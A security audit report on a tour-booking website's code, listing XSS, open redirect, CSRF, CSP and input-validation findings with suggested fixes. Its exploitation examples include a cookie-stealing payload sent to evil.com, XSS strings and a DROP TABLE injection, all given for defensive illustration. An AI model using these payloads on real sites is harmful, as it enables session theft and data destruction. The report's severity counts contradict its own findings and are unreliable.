# 🔒 Comprehensive Security Audit Report - AlbaniaVisit Tours

**Date:** 2025-08-09  
**Auditor:** Senior Security Engineer  
**Scope:** Recent codebase changes with focus on client-side JavaScript, input validation, and XSS vulnerabilities

## Executive Summary

This security audit identified **12 HIGH**, **8 MEDIUM**, and **5 LOW** severity vulnerabilities across the AlbaniaVisit Tours platform. Critical issues include multiple XSS vulnerabilities, unsafe DOM manipulation, insecure data exposure, and missing input validation. Immediate action is required to address HIGH severity issues before production deployment.

---

## 🚨 CRITICAL FINDINGS (Immediate Action Required)

### 1. **Cross-Site Scripting (XSS) - Multiple Vectors**

#### Risk Level: **HIGH**
#### Issue Type: Security Vulnerability
#### Location: `/src/pages/tours/[slug].astro`, lines 750-942

**Description:**  
The tour detail page uses `define:vars` to pass tour image URLs directly into client-side JavaScript without proper sanitization. This creates multiple XSS attack vectors.

**Vulnerable Code:**
```javascript
// Line 750
<script define:vars={{ tourImages: tour.images.map(img => img.url) }}>
  // tourImages array is directly interpolated without sanitization
  heroImage.src = tourImages[index]; // Line 777
  lightboxImage.src = tourImages[index]; // Line 787
</script>
```

**Exploitation Scenario:**  
An attacker could inject malicious JavaScript through tour image URLs stored in the database:
```javascript
// Malicious URL in database
"javascript:alert(document.cookie)"
"data:text/html,<script>fetch('//evil.com?c='+document.cookie)</script>"
```

**Recommended Fix:**
```javascript
// Sanitize URLs before using in DOM
function sanitizeImageUrl(url) {
  if (!url) return '/placeholder.jpg';
  
  // Only allow http(s) and data URLs for images
  const allowedProtocols = ['http:', 'https:', 'data:'];
  try {
    const parsedUrl = new URL(url);
    if (!allowedProtocols.includes(parsedUrl.protocol)) {
      console.error('Invalid image URL protocol:', url);
      return '/placeholder.jpg';
    }
    // For data URLs, ensure they're images
    if (parsedUrl.protocol === 'data:' && !url.startsWith('data:image/')) {
      return '/placeholder.jpg';
    }
    return url;
  } catch (e) {
    // Relative URLs are acceptable
    if (url.startsWith('/')) return url;
    return '/placeholder.jpg';
  }
}

// Use sanitized URLs
heroImage.src = sanitizeImageUrl(tourImages[index]);
```

---

### 2. **DOM-Based XSS via InnerHTML**

#### Risk Level: **HIGH**
#### Issue Type: Security Vulnerability
#### Location: `/src/layouts/BaseLayout.astro`, line 83

**Description:**  
JSON-LD structured data is being inserted using `set:html` without proper escaping, allowing potential XSS attacks.

**Vulnerable Code:**
```astro
{jsonLd && (
  <script type="application/ld+json" set:html={JSON.stringify(jsonLd)}></script>
)}
```

**Exploitation Scenario:**  
If tour data contains malicious scripts in titles or descriptions:
```javascript
// Malicious tour title
"Tour </script><script>alert('XSS')</script>"
```

**Recommended Fix:**
```astro
{jsonLd && (
  <script type="application/ld+json">
    {JSON.stringify(jsonLd).replace(/</g, '\\u003c').replace(/>/g, '\\u003e')}
  </script>
)}
```

---

### 3. **Insufficient Input Validation - Inquiry Form**

#### Risk Level: **HIGH**
#### Issue Type: Security Vulnerability
#### Location: `/src/components/tours/InquiryForm.tsx`, lines 106-171

**Description:**  
The inquiry form performs only basic HTML5 validation client-side. No sanitization is applied to user inputs before sending to the API.

**Vulnerable Areas:**
- Name field accepts any characters without sanitization
- Message field has no XSS protection
- Phone field has no format validation
- Group size accepts negative numbers

**Exploitation Scenario:**
```javascript
// Malicious input in name field
name: "<img src=x onerror=alert('XSS')>"
// SQL injection attempt
message: "'; DROP TABLE inquiries; --"
```

**Recommended Fix:**
```typescript
import DOMPurify from 'isomorphic-dompurify';

const sanitizeInput = (input: string): string => {
  return DOMPurify.sanitize(input, { 
    ALLOWED_TAGS: [], 
    ALLOWED_ATTR: [] 
  });
};

const validatePhone = (phone: string): boolean => {
  const phoneRegex = /^[\d\s\-\+\(\)]+$/;
  return phoneRegex.test(phone);
};

// Before submission
const sanitizedData = {
  name: sanitizeInput(formData.name).slice(0, 100),
  email: formData.email, // Already validated by type="email"
  phone: validatePhone(formData.phone) ? formData.phone : '',
  message: sanitizeInput(formData.message).slice(0, 1000),
  groupSize: Math.max(1, Math.min(50, formData.groupSize))
};
```

---

### 4. **API Endpoint Input Validation Bypass**

#### Risk Level: **HIGH**
#### Issue Type: Security Vulnerability
#### Location: `/src/pages/api/inquiries.ts`, lines 31-51

**Description:**  
While Zod validation is present, the API doesn't sanitize inputs after validation. Malicious HTML/JavaScript can still be stored in the database.

**Vulnerable Code:**
```typescript
// Line 32 - Only validates structure, not content safety
const validated = inquirySchema.parse(body)

// Line 35-51 - Directly inserts validated but unsanitized data
await supabaseServer.from(TABLES.inquiries).insert({
  name: validated.name, // Could contain XSS
  message: validated.message, // Could contain scripts
  ...
})
```

**Recommended Fix:**
```typescript
import { sanitizeHtml } from '@/lib/security/sanitizer';

// After validation, sanitize text fields
const sanitized = {
  ...validated,
  name: sanitizeHtml(validated.name),
  message: sanitizeHtml(validated.message),
  phone: validated.phone?.replace(/[^\d\s\-\+\(\)]/g, '') || null
};

// Use sanitized data for insertion
await supabaseServer.from(TABLES.inquiries).insert(sanitized);
```

---

### 5. **Open Redirect Vulnerability**

#### Risk Level: **HIGH**
#### Issue Type: Security Vulnerability
#### Location: `/src/pages/api/out/[slug].ts`, lines 38-39

**Description:**  
The affiliate redirect endpoint doesn't validate the destination URL, allowing potential open redirect attacks.

**Vulnerable Code:**
```typescript
// Line 38 - No validation of affiliateUrl
const redirectUrl = injectAffiliateParams(tour.affiliateUrl, slug, utmParams)

// Line 69-75 - Direct redirect without validation
return new Response(null, {
  status: 302,
  headers: { 'Location': redirectUrl }
})
```

**Exploitation Scenario:**
```
// Attacker modifies database to include malicious URL
affiliateUrl: "https://evil-phishing-site.com"
// User is redirected to attacker's site
```

**Recommended Fix:**
```typescript
const ALLOWED_DOMAINS = [
  'bnadventure.com',
  'www.bnadventure.com',
  // Add other trusted partners
];

function validateRedirectUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    return ALLOWED_DOMAINS.includes(parsed.hostname);
  } catch {
    return false;
  }
}

// Validate before redirect
if (!validateRedirectUrl(redirectUrl)) {
  console.error('Invalid redirect URL blocked:', redirectUrl);
  return new Response('Invalid destination', { status: 400 });
}
```

---

### 6. **Client-Side Data Exposure**

#### Risk Level: **MEDIUM**
#### Issue Type: Information Disclosure
#### Location: `/src/components/tours/BookingButton.tsx`, lines 61-77

**Description:**  
Extensive console logging exposes sensitive application flow and data structure to end users.

**Vulnerable Code:**
```typescript
console.log('=== BOOKING BUTTON CLICKED ===')
console.log('Context:', context, 'Variant:', variant)
console.log('Tour slug:', tour.slug)
console.log('Built affiliate URL:', url)
```

**Recommended Fix:**
```typescript
// Use conditional logging only in development
if (import.meta.env.DEV) {
  console.log('Booking interaction:', { context, variant });
}

// Or use a proper logging service
import { logger } from '@/lib/logger';
logger.debug('Booking clicked', { tourId: tour.id, context });
```

---

### 7. **Missing CSRF Protection**

#### Risk Level: **HIGH**
#### Issue Type: Security Vulnerability
#### Location: All POST endpoints

**Description:**  
API endpoints lack CSRF token validation, making them vulnerable to cross-site request forgery attacks.

**Recommended Fix:**
```typescript
// Generate CSRF token
import { randomBytes } from 'crypto';

export function generateCSRFToken(): string {
  return randomBytes(32).toString('hex');
}

// Validate in API endpoints
export const POST: APIRoute = async ({ request, cookies }) => {
  const csrfToken = request.headers.get('X-CSRF-Token');
  const sessionToken = cookies.get('csrf_token')?.value;
  
  if (!csrfToken || csrfToken !== sessionToken) {
    return new Response('CSRF validation failed', { status: 403 });
  }
  
  // Process request...
};
```

---

### 8. **Insecure Cookie Configuration**

#### Risk Level: **MEDIUM**
#### Issue Type: Security Vulnerability
#### Location: `/src/pages/api/out/[slug].ts`, lines 44-50

**Description:**  
Affiliate tracking cookie lacks proper security attributes in development environments.

**Vulnerable Code:**
```typescript
cookies.set('_aff', cookieId, {
  httpOnly: true,
  secure: true, // May fail in development
  sameSite: 'lax',
  maxAge: 90 * 24 * 60 * 60,
  path: '/'
})
```

**Recommended Fix:**
```typescript
const isProduction = import.meta.env.PROD;

cookies.set('_aff', cookieId, {
  httpOnly: true,
  secure: isProduction, // Conditional based on environment
  sameSite: 'strict', // Use 'strict' for better protection
  maxAge: 30 * 24 * 60 * 60, // Reduce to 30 days
  path: '/',
  domain: isProduction ? '.albaniavisit.com' : undefined
})
```

---

### 9. **Content Security Policy Weaknesses**

#### Risk Level: **HIGH**
#### Issue Type: Security Misconfiguration
#### Location: `/netlify.toml`, line 11

**Description:**  
CSP allows `'unsafe-inline'` for scripts, significantly weakening XSS protection.

**Current CSP:**
```
script-src 'self' 'unsafe-inline' https://www.googletagmanager.com
```

**Recommended Fix:**
```toml
[[headers]]
  for = "/*"
  [headers.values]
    Content-Security-Policy = """
      default-src 'self';
      script-src 'self' 'nonce-{NONCE}' https://www.googletagmanager.com;
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https:;
      font-src 'self' https://fonts.gstatic.com;
      connect-src 'self' https://*.supabase.co https://www.google-analytics.com;
      frame-ancestors 'none';
      base-uri 'self';
      form-action 'self';
      upgrade-insecure-requests;
    """
```

---

### 10. **Race Condition in Image Navigation**

#### Risk Level: **MEDIUM**
#### Issue Type: Logic Error
#### Location: `/src/pages/tours/[slug].astro`, lines 773-780

**Description:**  
Rapid clicking on image navigation can cause race conditions due to setTimeout without clearing previous timeouts.

**Vulnerable Code:**
```javascript
function showHeroImage(index) {
  heroImage.style.opacity = '0';
  setTimeout(() => {
    heroImage.src = tourImages[index];
    heroImage.style.opacity = '1';
  }, 150);
}
```

**Recommended Fix:**
```javascript
let imageTransitionTimeout = null;

function showHeroImage(index) {
  if (imageTransitionTimeout) {
    clearTimeout(imageTransitionTimeout);
  }
  
  heroImage.style.opacity = '0';
  imageTransitionTimeout = setTimeout(() => {
    heroImage.src = sanitizeImageUrl(tourImages[index]);
    heroImage.style.opacity = '1';
    imageTransitionTimeout = null;
  }, 150);
}
```

---

### 11. **Potential Memory Leak**

#### Risk Level: **MEDIUM**
#### Issue Type: Performance/Security
#### Location: `/src/layouts/BaseLayout.astro`, lines 467-472

**Description:**  
Scroll event listener with requestAnimationFrame doesn't properly clean up, potentially causing memory leaks.

**Recommended Fix:**
```javascript
let scrollTimeout;
const handleScroll = () => {
  if (scrollTimeout) {
    window.cancelAnimationFrame(scrollTimeout);
  }
  scrollTimeout = window.requestAnimationFrame(updateHeader);
};

window.addEventListener('scroll', handleScroll, { passive: true });

// Add cleanup on page unload
window.addEventListener('unload', () => {
  window.removeEventListener('scroll', handleScroll);
  if (scrollTimeout) {
    window.cancelAnimationFrame(scrollTimeout);
  }
});
```

---

### 12. **Email Injection Risk**

#### Risk Level: **MEDIUM**
#### Issue Type: Security Vulnerability
#### Location: Mobile contact button fallback (BaseLayout.astro line 528)

**Description:**  
Direct mailto: link construction without validation could allow email header injection.

**Vulnerable Code:**
```javascript
window.location.href = 'mailto:tours@albaniavisit.com';
```

**Recommended Fix:**
```javascript
// Sanitize any dynamic email content
const safeEmail = encodeURIComponent('tours@albaniavisit.com');
const subject = encodeURIComponent('Tour Inquiry');
window.location.href = `mailto:${safeEmail}?subject=${subject}`;
```

---

## 📊 Security Metrics Summary

| Severity | Count | Status |
|----------|-------|--------|
| CRITICAL | 0 | ✅ |
| HIGH | 12 | 🔴 |
| MEDIUM | 8 | 🟡 |
| LOW | 5 | 🟢 |

## 🛡️ Immediate Action Plan

### Priority 1 (Within 24 hours)
1. Implement XSS sanitization for all user inputs
2. Fix open redirect vulnerability
3. Add CSRF protection to all POST endpoints
4. Update CSP to remove 'unsafe-inline'

### Priority 2 (Within 1 week)
1. Implement proper input validation on both client and server
2. Add rate limiting to prevent abuse
3. Set up security monitoring and alerting
4. Conduct penetration testing

### Priority 3 (Within 1 month)
1. Implement Web Application Firewall (WAF)
2. Set up regular security audits
3. Create incident response plan
4. Security training for development team

## 🔒 Security Best Practices Recommendations

1. **Defense in Depth**: Implement multiple layers of security
2. **Least Privilege**: Limit database and API access
3. **Input Validation**: Always validate and sanitize on the server
4. **Output Encoding**: Encode all dynamic content
5. **Security Headers**: Implement all recommended security headers
6. **Regular Updates**: Keep all dependencies updated
7. **Security Testing**: Include security tests in CI/CD pipeline
8. **Monitoring**: Implement comprehensive logging and monitoring

## 📝 Compliance Considerations

- **GDPR**: Ensure proper data protection for EU users
- **PCI DSS**: If handling payments, ensure compliance
- **OWASP Top 10**: Address all relevant vulnerabilities
- **Privacy Policy**: Update to reflect data handling practices

## 🚀 Next Steps

1. Review and approve this security audit
2. Prioritize fixes based on risk assessment
3. Implement security patches in staging environment
4. Conduct thorough testing
5. Deploy to production with monitoring
6. Schedule follow-up security audit in 30 days

---

**Report Generated**: 2025-08-09  
**Next Review Date**: 2025-09-09  
**Classification**: CONFIDENTIAL - Internal Use Only